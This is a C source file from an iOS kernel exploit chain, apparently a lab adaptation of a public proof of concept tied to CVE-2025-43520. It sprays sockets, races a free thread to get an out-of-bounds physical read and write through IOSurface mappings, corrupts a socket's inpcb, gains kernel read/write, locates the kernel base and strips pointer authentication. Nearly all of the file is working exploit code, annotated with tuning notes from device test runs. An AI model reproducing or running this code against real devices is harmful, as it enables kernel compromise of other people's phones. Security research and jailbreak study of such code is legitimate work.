#include "poc.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sysctl.h>

#include "free_thread.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"

cs2_offsets_t cs2_offsets;
cs2_context_t cs2_ctx;

/* LSWCHAIN receipts: exactly one line per rung. rung 1 window, 2 pair,
   3 corrupt-verified, 4 kbase, 5 rw_verified. */
void cs2_chain_rung_log(int rung, const char *what, uint64_t a, uint64_t b) {
    if (rung >= 1 && rung > cs2_ctx.chain_rung) cs2_ctx.chain_rung = rung;
    LOG("[chain] rung=%d %s a=0x%llx b=0x%llx verified=%d",
        rung, what ? what : "?",
        (unsigned long long)a, (unsigned long long)b,
        cs2_ctx.rw_verified);
}

/* LSWARM-TARGET: filled by the ObjC runner from Documents/lightsword_wrong.txt
   before cs2_run() (see cs2/common.h note). */
uint64_t g_lsw_wrong_offs[16];
int g_lsw_wrong_n = 0;
/* LSWARM-CHURN (2026-11-15 receipts, dynamic): cs2 run alone = 0 oob
   read successes (65528 kr-fails); the SAME binary with the V23 lane's
   socket-churn thread live concurrently = 2000+ successes. The copy27
   read path needs live socket churn during the scan — cs2 never started
   one (churn_go belongs to the V23 lane). Same proven body/cadence. */
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread/qos.h>
static volatile int g_cs2_churn_go = 0;
static pthread_t g_cs2_churn_tid;
static void *cs2_churn_worker(void *arg) {
    (void)arg;
    /* 2026-11-19 watchdog law: the 23:23 bug-409 cascade receipt came from
       INTERACTIVE spinners starving daemon check-ins. UTILITY keeps the
       allocation density without the starvation class. */
    pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
    while (g_cs2_churn_go) {
        int fds[512];
        int count = 0;
        for (int i = 0; i < 512; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fds[i] >= 0) count++;
        }
        for (int i = 0; i < 512; i++)
            if (fds[i] >= 0) close(fds[i]);
        if (count > 0) {
            /* 2026-11-19: one line per 512-batch flooded 38k lines into the
               tap log. Keep the first 3 + every 256th for cadence evidence. */
            static uint64_t churn_batches = 0;
            churn_batches++;
            if (churn_batches <= 3 || (churn_batches % 256) == 0)
                LOG("socket churn: created %d, closed %d (batch %llu)",
                    count, count, (unsigned long long)churn_batches);
        }
        usleep(50);
    }
    return NULL;
}


kern_return_t cs2_pe_init(void) {
    // creates read and write fd
    cs2_init_files();
    if (cs2_ctx.executable_name == NULL) {
        uint32_t size = 0x1024;
        char* executable_path = calloc(1, size);
        _NSGetExecutablePath(executable_path, &size);
        char* executable_name = strrchr(executable_path, '/');
        if (executable_name != NULL) {
            executable_name = executable_name + 1;
        } else {
            executable_name = executable_path;
        }
        // save our executable name, since it's the oracle for inpcb
        cs2_ctx.executable_name = strdup(executable_name);
        free(executable_path);
    }

    // original allocs 1 page, we don't need that much
    cs2_ctx.shared = calloc(1, sizeof(cs2_free_shared_t));
    // create the free thread
    pthread_create(&cs2_ctx.free_thread, NULL, cs2_free_worker, cs2_ctx.shared);
    cs2_ctx.free_thread_started = true;

    LOG("free_thread_shared: %p", cs2_ctx.shared);
    return KERN_SUCCESS;
}

kern_return_t cs2_pe_v1(void) {
    // 0x1000 pages
    uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
    // if (cs2_ctx.is_a18_devices) {
    //     n_of_total_search_mapping_pages = 0x10 * 0x10;
    // }

    // 0x8000000 -> 128 mib
    uint64_t search_mapping_size = 0x2000 * vm_page_size;
    // if (cs2_ctx.is_a18_devices) {
    //     search_mapping_size = (0x10 * vm_page_size) / 4;
    // }

    // 0x40000000 -> 1gib
    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;

    // 8
    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;

    // 0xf00
    uint8_t* read_buffer = calloc(1, cs2_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, cs2_ctx.oob_size);

    // creates physically contiguous mapping in purple gfx mem and sets marker on it
    // 2 pages since first one is "in bounds" and the second one will be replaced with
    // a non-contiguous page in the race (hopefully)
    uint64_t contiguous_mapping_size = 2 * vm_page_size;
    cs2_init_phys_rw(contiguous_mapping_size);

    // commenting this out since it's only for A18

    /*
    mach_vm_address_t wired_mapping = 0;
    mach_vm_size_t wired_mapping_size = 0xC0000000;  // original is 3 * 1024 * 1024 * 1024
    if (cs2_ctx.is_a18_devices) {
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            free(read_buffer);
            free(write_buffer);
            return kr;
        }
        LOG("wired_mapping: %#llx", wired_mapping);
    }
    */

    uint64_t target_inp_gencnt_list[CS2_MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
    size_t target_inp_gencnt_count = 0;

    /* lab law 2026-10-24 (T8150/24A435 fire): upstream retries forever; the
       17 crashed at pass-2's FIRST oob_read with pass-1 surfaces leaked AND
       mlocked (munlock never ran on the fail path). Now: 2-pass bound,
       munlock every pass end, per-pass phys_footprint + oob kr telemetry. */
    size_t oob_read_fail_count = 0;
    /* OG restore: no churn inventions (note-252 law — OG launches only free_thread) */
    /* pass-2 wedge law: fire #2 froze at pass-2's first read after a fully
       healthy pass-1 (1.6M one-shot maps). Decode pending — tonight: one pass. */
    bool success = false;
    /* Dopamine runs this loop until success. The 2026-11-06 one-pass bound
       was a 24A435 pass-2 wedge workaround; on the 18.x/17.3 trains it makes
       a single unlucky sweep fatal for the tap. Retry a few times (the pass
       end already releases sockets/mappings) but stay inside the tap budget. */
    /* Dopamine's loop is while(true) until success. OG lane keeps that shape;
       the 300 s deadline turns a broken train into an honest failure instead
       of an infinite tap. copy27 remains one pass. */
    uint64_t max_passes = cs2_ctx.copy_confusion_lane ? 1 : UINT64_MAX;
    for (size_t pass = 0; pass < max_passes; pass++) {
        if (cs2_expired()) {
            LOG("budget expired before pass %lu — honest failure", pass + 1);
            break;
        }
        {
            struct task_vm_info tvi; mach_msg_type_number_t tc = TASK_VM_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&tvi, &tc) == KERN_SUCCESS)
                LOG("=== outer pass %lu phys_footprint=0x%llx ===", pass, (unsigned long long)tvi.phys_footprint);
        }
        // again, only for A18
        /*
        if (cs2_ctx.is_a18_devices) {
            cs2_surface_mlock(wired_mapping, wired_mapping_size);
            for (uint64_t s = 0; s < (wired_mapping_size / vm_page_size); s++) {
                memcpy((void*)(wired_mapping + s * vm_page_size), &(uint64_t){0}, sizeof(uint64_t));
            }
        }
        */

        mach_vm_address_t search_mappings[n_of_search_mappings];
        size_t search_mappings_count = 0;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = 0;
            // allocate 128mb * number of search mappings
            // these allocations are NOT contiguous
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                /* early-return guard: without this the churn thread outlives
                   the tap and spins at USER_INTERACTIVE forever (the
                   2026-11-19 "never ends" receipt). No-op pre-churn. */
                if (g_cs2_churn_go) {
                    g_cs2_churn_go = 0;
                    pthread_join(g_cs2_churn_tid, NULL);
                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
                }
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // place marker on start of each page
            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
                memcpy((void*)(search_mapping_address + k), &cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
            }

            // save the address of the mapping onto the search mappings array
            search_mappings[search_mappings_count++] = search_mapping_address;
        }

        cs2_ctx.socket_ports_count = 0;

        uint64_t open_max = CS2_MAX_OPEN_FDS;  // bsd/sys/syslimits.h
        uint64_t maxfiles = 3 * open_max;  // bsd/conf/param.c
        uint64_t leeway = 4096 * 2;        // I have no idea
        // maxfiles - leeway = 22528 -> 0x5800 aka CS2_MAX_SOCKETS_COUNT, why
        // this limit seems arbitrary?
        /* LSWARM-CHURN phase fix (2026-11-15 receipts): the winning runs
           had the OTHER lane's churn spraying while cs2's own 22528-socket
           spray landed. Starting churn only after the spray reproduced
           the old 0-success state. Churn must be live BEFORE the spray and
           through the scan — the spray must allocate into an active churn. */
        if (!g_cs2_churn_go) {
            g_cs2_churn_go = 1;
            if (pthread_create(&g_cs2_churn_tid, NULL, cs2_churn_worker, NULL) == 0)
                LOG("[churn] cs2 churn thread started BEFORE the spray");
            else { g_cs2_churn_go = 0; LOG_ERR("[churn] pthread_create failed — scan without churn"); }
        }
        // spray sockets, save pcb gencnt
        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
            uint64_t port = cs2_spray_socket();
            if (port == UINT64_MAX) {
                LOG("failed to spray sockets: %#lx", cs2_ctx.socket_ports_count);
                break;
            }
        }

        // these are the start and end pcb gencnts
        // they are allocated in incrementing order
        uint64_t start_pcb_id = cs2_ctx.socket_pcb_ids[0];
        uint64_t end_pcb_id = cs2_ctx.socket_pcb_ids[cs2_ctx.socket_ports_count - 1];
        LOG("socket_ports_count: %#lx", cs2_ctx.socket_ports_count);
        LOG("start_pcb_id: %#llx", start_pcb_id);
        LOG("end_pcb_id: %#llx", end_pcb_id);

        success = false;
        /* LSWARM-CHURN: churn live for the whole scan (V23 cadence) */
        if (!g_cs2_churn_go) {
            g_cs2_churn_go = 1;
            if (pthread_create(&g_cs2_churn_tid, NULL, cs2_churn_worker, NULL) == 0)
                LOG("[churn] cs2 churn thread started for the scan");
            else { g_cs2_churn_go = 0; LOG_ERR("[churn] pthread_create failed — scan without churn"); }
        }
        // 8 search mappings
        for (size_t s = 0; s < search_mappings_count; s++) {
            /* 2026-11-19 cs2_krw_log 3: expiry only broke the inner sweep,
               so maps 2..7 still wired dead 128MB surfaces and the tap
               churned minutes past budget. Stop before the mlock. */
            if (cs2_expired()) {
                LOG("budget expired before mapping %lu (pass=%lu) — stop; no dead mlocks",
                    (unsigned long)s, (unsigned long)pass);
                break;
            }
            mach_vm_address_t search_mapping_address = search_mappings[s];
            LOG("looking in search mapping: %lu", s);

            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                /* early-return guard: without this the churn thread outlives
                   the tap and spins at USER_INTERACTIVE forever (the
                   2026-11-19 "never ends" receipt). No-op pre-churn. */
                if (g_cs2_churn_go) {
                    g_cs2_churn_go = 0;
                    pthread_join(g_cs2_churn_tid, NULL);
                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
                }
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
            cs2_surface_mlock(search_mapping_address, search_mapping_size);

            /* LSWARM-TARGET: probe the calib's PROVEN WRONG windows in THIS
               mapping first (boot-recurrence law: 0xba0000 recurs across
               boots, 0x57c0000 x3 same page-id). Receipt line per probe;
               a hit goes straight to the pcb hunt. Falls through to the
               unchanged linear sweep with the table logged.
               v15 chain law (2026-11-15 receipts): the hit window reads
               WHOLESALE foreign socket-buffer content with kptr=0 — the
               inpcb pair lives at a NEIGHBOR page, not inside the window.
               On a foreign hit: probe +-3 page neighbors, hunt each, then
               SKIP the blind sweep for this mapping (tonight's sweep froze
               past deadline with the target layer already proven). */
            int lswProven = 0;
            uint64_t lswHitOff = 0;
            for (int li = 0; li < g_lsw_wrong_n; li++) {
                size_t lt = (size_t)(g_lsw_wrong_offs[li] & ~((uint64_t)vm_page_size - 1));
                if (lt >= search_mapping_size) continue;
                kern_return_t lkr = cs2_oob_read(memory_object, lt, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
                uint64_t lq0 = ((uint64_t *)read_buffer)[0];
                LOG("[lswarm] map=%lu off=0x%zx kr=%#x q0=%016llx q1=%016llx",
                    s, lt, lkr,
                    (unsigned long long)lq0,
                    (unsigned long long)((uint64_t *)read_buffer)[1]);
                if (lkr == KERN_SUCCESS &&
                    cs2_find_and_corrupt(memory_object, lt, read_buffer, write_buffer,
                                         target_inp_gencnt_list, &target_inp_gencnt_count, false)
                        == KERN_SUCCESS) {
                    success = true;
                    break;
                }
                /* foreign content (not our marker) = target layer proven */
                if (lkr == KERN_SUCCESS && lq0 != cs2_ctx.random_marker) {
                    lswProven = 1;
                    lswHitOff = lt;
                    /* [lswarm-cls] static-verified fingerprints (23F77 audit
                       2026-11-15): inpcb record = qword+0x38 AND +0x40 both
                       kernel-range at a 0x400 boundary; socket object =
                       qword+0x18 kernel-range AND int32+0x23c in (0,0x10000).
                       Read-only buffer scan — identifies WHAT the confused
                       window holds so the next tap knows which rung to take. */
                    {
                        uint32_t cls_len = (uint32_t)((cs2_ctx.oob_size < 0x4000) ? cs2_ctx.oob_size : 0x4000);
                        int kq = 0, ipc_cand = -1, so_cand = -1;
                        for (uint32_t wq = 0; wq + 8 <= cls_len; wq += 8) {
                            uint64_t v = *(uint64_t *)((uint8_t *)read_buffer + wq);
                            if (cs2_own_anchor(v)) continue;   /* own fil-tag (any anchor in the set), not a kptr */
                            if ((v >> 48) >= 0xffff) kq++;
                        }
                        for (uint32_t zo = 0; zo + 0x400 <= cls_len; zo += 0x400) {
                            uint64_t z38 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x38);
                            uint64_t z40 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x40);
                            if (ipc_cand < 0 && (z38 >> 48) >= 0xffff && (z40 >> 48) >= 0xffff &&
                                !cs2_own_anchor(z38) && !cs2_own_anchor(z40))
                                ipc_cand = (int)zo;
                            uint64_t s18 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x18);
                            int32_t s23c = *(int32_t *)((uint8_t *)read_buffer + zo + 0x23c);
                            if (so_cand < 0 && (s18 >> 48) >= 0xffff && s23c > 0 && s23c < 0x10000 &&
                                !cs2_own_anchor(s18))
                                so_cand = (int)zo;
                        }
                        LOG("[lswarm-cls] map=%lu off=0x%zx kq=%d inpcb_cand=0x%x sock_cand=0x%x (0x400 stride, static-verified)",
                            s, lt, kq, (unsigned)ipc_cand, (unsigned)so_cand);
                        cs2_chain_rung_log(1,
                            (ipc_cand >= 0 || so_cand >= 0) ? "window+target-cand" : "window-only",
                            lt, (uint64_t)kq);
                    }
                    for (int nb = -3; nb <= 3 && !success; nb++) {
                        if (nb == 0) continue;
                        int64_t nt = (int64_t)lt + (int64_t)nb * (int64_t)vm_page_size;
                        if (nt < 0 || (uint64_t)nt >= search_mapping_size) continue;
                        kern_return_t nkr = cs2_oob_read(memory_object, (size_t)nt,
                                                         cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
                        uint64_t nq0 = ((uint64_t *)read_buffer)[0];
                        LOG("[lswarm-nb] map=%lu off=0x%llx kr=%#x q0=%016llx krange=%d",
                            s, (unsigned long long)nt, nkr,
                            (unsigned long long)nq0,
                            (nq0 >> 48) >= 0xffff);
                        if (nkr == KERN_SUCCESS &&
                            cs2_find_and_corrupt(memory_object, (size_t)nt, read_buffer, write_buffer,
                                                 target_inp_gencnt_list, &target_inp_gencnt_count, false)
                                == KERN_SUCCESS) {
                            success = true;
                        }
                    }
                    break;   /* one proven window per mapping is the receipt */
                }
            }
            if (success) break;

            // start the party
            /* LSWCHAIN (2026-11-16 USB receipts): a proven window RESUMES the
               sweep at the hit page instead of skipping the mapping. The
               windows read wholesale foreign socket-buffer content with no
               inpcb class, so the pair lives a few pages away — skipping
               threw that evidence away, and restarting at 0 re-read
               everything. Resume is the middle path. */
            uint64_t seeking_offset = lswProven ? (lswHitOff & ~((uint64_t)vm_page_size - 1)) : 0;
            if (lswProven)
                LOG("[lswarm] map=%lu resuming sweep at hit 0x%llx (window proven; hunt continues)", s, (unsigned long long)seeking_offset);

            // seeking offset increases by page_size, until search_mapping_size
            // since search_mapping_size is 0x8000000, we can loop 0x2000 times
            LOG_DEBUG("search mapping size %#llx", search_mapping_size);
            // NOTE:
            // fix mach_vm_map err on free thread, we'd try to map outside memory object
            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
                if (cs2_expired()) { LOG("budget expired in sweep pass=%lu map=%lu off=%#llx", pass, s, (unsigned long long)seeking_offset); break; }
                // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
                // oob_size -> 0xf00, oob_offset -> 0x100
                kr = cs2_oob_read(memory_object, seeking_offset, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
                if (kr != KERN_SUCCESS) {
                    oob_read_fail_count++;
                    if (oob_read_fail_count <= 4)
                        LOG("oob_read kr=%#x map=%lu off=%#llx pass=%lu", kr, s, seeking_offset, pass);
                }
                if (kr == KERN_SUCCESS) {
                    // LOG_DEBUG("Finding and corrupting socket...");
                    if (cs2_find_and_corrupt(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += vm_page_size;
                /* copy27: yield so configd can check in (watchdog 180s on 24A435). */
                if (cs2_ctx.copy_confusion_lane &&
                    ((seeking_offset / vm_page_size) % 32ull) == 0)
                    usleep(20000);
            }

            // NOTE:
            // I don't think this will do anything worth
            // since I've never had a success pass first mapping
            // unless when we never find target, this would
            // help with memory pressure?
            // cs2_surface_munlock(search_mapping_address);
            kr = mach_port_deallocate(mach_task_self(), memory_object);
            if (kr != KERN_SUCCESS) {
                /* early-return guard: without this the churn thread outlives
                   the tap and spins at USER_INTERACTIVE forever (the
                   2026-11-19 "never ends" receipt). No-op pre-churn. */
                if (g_cs2_churn_go) {
                    g_cs2_churn_go = 0;
                    pthread_join(g_cs2_churn_tid, NULL);
                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
                }
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            if (success) {
                break;
            }
        }

        // deallocate fileport_makeport sockets
        // at this point the target sockets are already back to being fd
        /* stop churn BEFORE releasing the spray (V23 order) */
        if (g_cs2_churn_go) {
            g_cs2_churn_go = 0;
            pthread_join(g_cs2_churn_tid, NULL);
            LOG("[churn] cs2 churn thread stopped (pre-release)");
        }
        cs2_sockets_release();

        // munlock + release surfaces BEFORE deallocating (upstream never
        // unlocked on the fail path — the pass-2 SIGKILL suspect on 24A435)
        while (search_mappings_count > 0) {
            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
            cs2_surface_munlock(search_mapping_address);
            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
        }
        cs2_surface_reset_locked();   /* slot-table hygiene: keep passes independent */

        // if (cs2_ctx.is_a18_devices) {
        //     cs2_surface_munlock(wired_mapping);
        // }

        if (success) {
            break;
        }
    }

    if (!success) {
        LOG("scan exhausted: 1 pass (pass-2 wedge law), no corruption accepted, oob_read kr-fails=%lu success_read_count=%llu — one tap per fresh boot",
            oob_read_fail_count, (unsigned long long)cs2_ctx.success_read_count);
        free(read_buffer);
        free(write_buffer);
        return KERN_FAILURE;
    }
    free(read_buffer);
    free(write_buffer);
    return KERN_SUCCESS;
}

static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}

bool cs2_is_arm64e(void)
{
    static bool isArm64e = false;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        cpu_subtype_t cpusubtype = 0;
        size_t len = sizeof(cpusubtype);
        sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0);
        isArm64e = (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
    });
    return isArm64e;
}

uint64_t cs2_unpac_ptr(uint64_t kptr)
{
    if (cs2_is_arm64e()) {
        return __xpaci(kptr);
    }
    else {
        return kptr;
    }
}

kern_return_t cs2_pe(void) {
    char* device_machine = cs2_machine();
    // kern_return_t kr = KERN_SUCCESS;

    // I didn't add support for pe_v2, I don't have a test device
    if (strstr(device_machine, "iPhone17,") != NULL) {
        // LOG("running on A18 devices");
        // cs2_ctx.is_a18_devices = true;
        // sleep(8);
        // cs2_pe_init();
        // pe_v2();
    } else {
        LOG("running on non-A18 devices");
        cs2_pe_init();
        // lab: upstream ignores the v1 return; we propagate failure so the
        // caller never reports KRW from a half-initialized context.
        kern_return_t v1_kr = cs2_pe_v1();
        if (v1_kr != KERN_SUCCESS) {
            LOG_ERR("cs2_pe_v1 failed: %s (%d)", mach_error_string(v1_kr), v1_kr);
            return v1_kr;
        }
    }

    // not going to fix typo to keep it close to original
    LOG("highiest_success_idx: %llu", cs2_ctx.highiest_success_idx);
    LOG("success_read_count: %llu", cs2_ctx.success_read_count);

    // cleanup
    atomic_store_explicit(&cs2_ctx.shared->go_sync, 0, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(cs2_ctx.free_thread, NULL);

    // we have stable rw, we can close the fds now
    close(cs2_ctx.write_fd);
    close(cs2_ctx.read_fd);
    if (cs2_ctx.rw_socket_pcb == 0 || cs2_ctx.control_socket <= 0) {
        LOG_ERR("no pcb / control socket after scan — skip kernel_base walk (kaddr 0x20 is inpcb field# garbage)");
        cs2_chain_rung_log(2, "no-pair", cs2_ctx.success_read_count, 0);
        return KERN_FAILURE;
    }
    cs2_ctx.control_socket_pcb = cs2_early_kread64(cs2_ctx.rw_socket_pcb + koffsetof(inpcb, list_next));

    uint64_t textPtr = 0;
    if (__builtin_available(iOS 17.0, *)) {
        uint64_t pcbinfo_pointer = cs2_early_kread64(cs2_ctx.control_socket_pcb + koffsetof(inpcb, pcbinfo));
        uint64_t ipi_zone = cs2_early_kread64(pcbinfo_pointer + koffsetof(inpcbinfo, ipi_zone));
        textPtr = cs2_early_kread64(ipi_zone + koffsetof(kalloc_type_view, kt_zv_zv_name));
    }
    else {
        uint64_t socketPtr = cs2_early_kread64(cs2_ctx.control_socket_pcb + koffsetof(inpcb, socket));
        uint64_t protoPtr = cs2_early_kread64(socketPtr + koffsetof(socket, proto));
        textPtr = cs2_unpac_ptr(cs2_early_kread64(protoPtr + koffsetof(protosw, input)));
    }
    
    uint64_t kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
    uint64_t walk_tries = 0;
    int walk_rejects = 0;
    while (true) {
        // lab: bounded walk (upstream would spin forever if kread returns 0)
        if (++walk_tries > 0x4000 || cs2_expired()) {
            LOG_ERR("kernel_base walk exhausted after %#llx pages (last=0x%llx) — no magic through the corrupted socket",
                    (unsigned long long)walk_tries, (unsigned long long)kernel_base);
            cs2_chain_rung_log(4, "walk-exhausted", kernel_base, walk_tries);
            return KERN_FAILURE;
        }
        //PRINT_VAR(kernel_base);
        uint64_t hdr = 0;
        if (cs2_early_kread64_ok(kernel_base, &hdr) != 0) {
            kernel_base -= PAGE_SIZE;   /* a failed read is never a magic */
            continue;
        }
        if (hdr == 0x100000cfeedfacf) {
            uint64_t typeinfo = 0;
            (void)cs2_early_kread64_ok(kernel_base + 8, &typeinfo);
            /* Board law set (LuminaMHTypeinfoOK) — the old availability
               ladder accepted only ONE value on 26.x. */
            if (typeinfo == 0x200000000 || typeinfo == 0xc00000002 || typeinfo == 0xcc0000002) {
                LOG("[chain] rung=4 kbase=0x%llx magic=0x%llx typeinfo=0x%llx pages=%llu",
                    (unsigned long long)kernel_base, (unsigned long long)hdr,
                    (unsigned long long)typeinfo, (unsigned long long)walk_tries);
                break;
            }
            if (walk_rejects++ < 4)
                LOG("[chain] rung=4 magic at 0x%llx but typeinfo=0x%llx outside {0x200000000,0xc00000002,0xcc0000002}",
                    (unsigned long long)kernel_base, (unsigned long long)typeinfo);
        }
        kernel_base -= PAGE_SIZE;
    }

    cs2_ctx.kernel_base = kernel_base;
    cs2_ctx.kernel_slide = kernel_base - kconstant(staticBase);
    cs2_ctx.rw_verified = 1;
    cs2_chain_rung_log(5, "rw_verified", cs2_ctx.kernel_base, cs2_ctx.kernel_slide);

    // real cleanup
    cs2_sockets_leak_forever();
    return KERN_SUCCESS;
}

int cs2_run(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&cs2_offsets, 0, sizeof(cs2_offsets));
    memset(&cs2_ctx, 0, sizeof(cs2_ctx));
    // 2 pages
    cs2_ctx.target_file_size = vm_page_size * 2;
    cs2_ctx.oob_offset = 0x100;
    cs2_ctx.oob_size = 0xf00;
    cs2_ctx.n_of_oob_pages = 2;
    cs2_ctx.copy_confusion_lane = 0;
    {
        char osv[32] = {0};
        size_t ol = sizeof(osv);
        if (sysctlbyname("kern.osversion", osv, &ol, NULL, 0) == 0) {
            int major = 0;
            char train = 0;
            if (sscanf(osv, "%2d%c", &major, &train) >= 2) {
                /* CVE-2025-43520 patched 18.7.2 / 26.1 → 23B+ and 24A+.
                   Live 24A435: pwritev returns length, never EFAULT. */
                if (major >= 24 || (major == 23 && train >= 'B'))
                    cs2_ctx.copy_confusion_lane = 1;
            }
        }
    }
    if (cs2_ctx.copy_confusion_lane)
        LOG("lane: 27.0 copy27 PARTIAL-window HIT (success pwritev + %#llx iov, mixed qwords). hop-1 KEEP CLOSED. not CS verbatim.",
            (unsigned long long)vm_page_size);
    else
        LOG("lane: OG EFAULT (w==-1) — 43520-viable train");

    arc4random_buf(&cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
    arc4random_buf(&cs2_ctx.wired_page_marker, sizeof(cs2_ctx.wired_page_marker));

    cs2_ctx.default_file_content = calloc(1, cs2_ctx.target_file_size);
    /* 2026-11-19 fil tag: REAL same-boot heap anchor when the glue armed it
       (board leaks[] via LabHeapAnchorSameBoot), else the per-boot random
       marker. The anchor is EXCLUDED from every kptr-shape classifier —
       an anchor-tagged window is a geometry measurement of OUR OWN pages,
       never a kernel disclosure. */
    if (cs2_ctx.heap_anchor_armed)
        memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.heap_anchor, cs2_ctx.target_file_size);
    else
        memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.random_marker, cs2_ctx.target_file_size);

    // size of read is 32 bytes
    cs2_ctx.getsockopt_read_data = calloc(1, 32);
    int ret = 0;

    if (cs2_offsets_init() != 0) {
        LOG_ERR("cs2_offsets_init failed");
        ret = -1;
        goto cleanup;
    }
    cs2_ctx.offsets = cs2_offsets;

    kern_return_t kr = cs2_pe();
    if (kr != KERN_SUCCESS) {
        LOG_ERR("cs2_pe failed: %s (%d)", mach_error_string(kr), kr);
        ret = kr;
        goto cleanup;
    }

    LOG("kernel_base: %#llx", cs2_ctx.kernel_base);
    LOG("kernel_slide: %#llx", cs2_ctx.kernel_slide);

    uint64_t end = mach_absolute_time();
    uint64_t elapsed = end - start;
    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
    LOG("Time taken for KRW: %.3f ms", elapsed_ms);

cleanup:
    // lab: upstream only joins the free thread on the success path; on a
    // failure return it would free shared under a live worker. Join first.
    if (cs2_ctx.free_thread_started) {
        atomic_store_explicit(&cs2_ctx.shared->go_sync, 0, memory_order_seq_cst);
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        pthread_join(cs2_ctx.free_thread, NULL);
        cs2_ctx.free_thread_started = false;
    }
    free(cs2_ctx.shared);
    free(cs2_ctx.default_file_content);
    free(cs2_ctx.getsockopt_read_data);
    free(cs2_ctx.executable_name);
    return ret;
}
